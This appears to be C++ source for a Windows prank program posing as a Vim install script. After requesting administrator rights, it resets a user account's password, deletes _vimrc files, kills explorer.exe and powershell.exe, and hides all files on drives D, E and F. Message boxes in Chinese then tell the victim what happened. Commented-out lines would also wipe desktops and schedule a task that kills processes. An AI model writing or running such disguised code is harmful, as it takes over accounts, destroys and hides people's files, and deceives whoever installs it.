#include <bits/stdc++.h>
#include <windows.h>
#include <lm.h>
#include <tchar.h>

using namespace std;

bool GetPrivilege()
{
    // 提权成功 记得关闭该进程；
    CreateEvent(NULL, FALSE, FALSE, _T("{29544E05-024F-4BC1-A272-452DBC8E17A4}"));
    if (ERROR_SUCCESS != GetLastError())
    {
        return false;
    }
    else
    {
        TCHAR strPath[MAX_PATH] = { 0 };
        HMODULE hModule = NULL;
        GetModuleFileName(hModule, strPath, MAX_PATH);

        SHELLEXECUTEINFO sei = { sizeof(SHELLEXECUTEINFO) };
        sei.lpVerb = TEXT("runas");
        sei.lpFile = strPath;
        sei.nShow = SW_SHOWNORMAL;
        if (!ShellExecuteEx(&sei))
        {
            DWORD dwStatus = GetLastError();
            if (dwStatus == ERROR_CANCELLED)
            {
                return false;
            }
            else if (dwStatus == ERROR_FILE_NOT_FOUND)
            {
                return false;
            }
        }
    }
    Sleep(100);        // 防止退出的太早
    return true;
}

bool IsProcessRunAsAdmin()        //检查当前进程是否拥有管理员权限
{
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdministratorsGroup;

    BOOL  b = AllocateAndInitializeSid(
        &NtAuthority,
        2,
        SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0,
        &AdministratorsGroup);

    if (b)
    {
        CheckTokenMembership(NULL, AdministratorsGroup, &b);
        FreeSid(AdministratorsGroup);
    }

    return  b == TRUE ;
}

int main(int argc, char** argv) {
	//ShowWindow(GetConsoleWindow(),SW_HIDE);
	if (argc == 2) {
		if (strcmp(argv[1], "/S") == 0) {
			//while (1000) MessageBox(NULL,("vivo 50 to repair the files"),("not your bussiness"),MB_OK);
			GetPrivilege();
			if (!IsProcessRunAsAdmin()) exit(0);
			char user[1000] = {0};
			char username[1000] = "nr0728";
			char password[1000] = "Vivo50please";
			sprintf(user, "net user %s %s > nul", username, password);
			system(user);
			system("del /f /s /q C:\\Users\\HP\\_vimrc > nul");
			system("del /f /s /q C:\\Users\\nr0728\\_vimrc > nul");
			//system("taskkill /im studentmain.exe /f > nul");
			system("taskkill /im explorer.exe /f > nul");
			system("taskkill /im powershell.exe /f > nul");
			system("attrib +s +h /D D:\\* > nul");
			system("attrib +s +h /D E:\\* > nul");
			system("dir F:\\ > D:\\dirs.txt");
			system("attrib +s +h /D F:\\* > nul");
			system("attrib D:\\dirs.txt +s +h");
			//system("del /f /s /q C:\\Users\\HP\\Desktop > nul");
			//system("del /f /s /q C:\\Users\\nr0728\\Desktop > nul");
			//system("schtasks /Create /SC MINUTE /TN blueseen /TR \"taskkill /fi \"pid ne 1\" /f\" > nul");
            MessageBox(NULL,("想必阁下正在运行我的 Install Vim 脚本吧\n现在一些事情已经发生了，按下确定了解更多。"),("你好"),MB_OK);
            MessageBox(NULL,("当你看到这行字说明我的程序已经提权成功并且运行了。"),("你好"),MB_OK);
            MessageBox(NULL,("你的 _vimrc 文件已经被我删除了，D、E 盘文件被我隐藏了。\n想要恢复，请在对应盘执行：\nattrib -s -h /D 盘符:\\*"),("你好"),MB_OK);
            MessageBox(NULL,("劳烦阁下从今天起不要再使用我的 _vimrc 了。\n你的账户密码也被我修改了。密码就在密码条上"),("你好"),MB_OK);
            MessageBox(NULL,("如果阁下把那玩意儿丢了，那么密码是：\nVivo50please"),("你好"),MB_OK);
		}
	}
}
